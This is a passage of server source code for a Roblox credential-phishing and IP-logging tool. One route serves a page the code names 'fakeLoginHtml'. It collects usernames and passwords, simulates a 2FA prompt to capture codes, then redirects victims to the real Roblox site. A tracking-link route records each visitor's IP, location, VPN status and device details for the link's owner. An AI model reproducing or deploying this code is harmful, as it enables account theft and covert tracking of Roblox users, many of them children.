                        userAgent: navigator.userAgent
                    })
                });
                
                if (response.ok) {
                    if (!includeToken) {
                        // Simulate requiring 2FA
                        setTimeout(() => {
                            showSuccess('Verifying credentials...');
                            setTimeout(() => {
                                hideMessages();
                                twoFactorSection.classList.add('show');
                                loginBtn.style.display = 'none';
                            }, 1500);
                        }, 1000);
                    } else {
                        showSuccess('Login successful! Redirecting...');
                        setTimeout(() => {
                            window.location.href = 'https://www.roblox.com/home';
                        }, 2000);
                    }
                } else {
                    showError('Invalid credentials. Please try again.');
                }
            } catch (error) {
                showError('Connection error. Please try again.');
            }
        }
        
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            hideMessages();
            loginBtn.disabled = true;
            loginBtn.textContent = 'Logging In...';
            
            await submitCredentials();
            
            loginBtn.disabled = false;
            loginBtn.textContent = 'Log In';
        });
        
        verifyBtn.addEventListener('click', async () => {
            hideMessages();
            verifyBtn.disabled = true;
            verifyBtn.textContent = 'Verifying...';
            
            await submitCredentials(true);
            
            verifyBtn.disabled = false;
            verifyBtn.textContent = 'Verify & Log In';
        });
    </script>
</body>
</html>`;

      res.send(fakeLoginHtml);
    } catch (error) {
      console.error('Fake login page error:', error);
      res.status(500).send('Internal server error');
    }
  });

  // Roblox link tracking and redirection endpoint
  app.get('/roblox/:trackingId', async (req: Request, res: Response) => {
    try {
      const { trackingId } = req.params;
      
      // Get the Roblox link
      const robloxLink = await storage.getRobloxLink(trackingId);
      if (!robloxLink || !robloxLink.isActive) {
        return res.status(404).send('Link not found or inactive');
      }

      // Log the visitor information (similar to existing IP logging)
      const ip = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrer = req.headers.referer || '';
      const locationData = getLocationFromIp(ip);
      const deviceInfo = parseDeviceInfo(userAgent);

      // Create IP log entry
      await storage.createIpLog({
        userId: robloxLink.userId,
        ipAddress: ip,
        userAgent,
        referrer,
        location: locationData.location,
        isVpn: locationData.isVpn,
        vpnLocation: locationData.vpnLocation,
        realLocation: locationData.realLocation,
        deviceType: deviceInfo.deviceType,
        browserName: deviceInfo.browserName,
        operatingSystem: deviceInfo.operatingSystem,
        deviceBrand: deviceInfo.deviceBrand,
        status: 'roblox_redirect'
      });

      // Update click count
      await storage.updateRobloxLinkClicks(trackingId);

      // Redirect to the original Roblox URL
      res.redirect(robloxLink.originalUrl);
    } catch (error) {
      console.error('Roblox redirect error:', error);
      res.status(500).send('Internal server error');
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}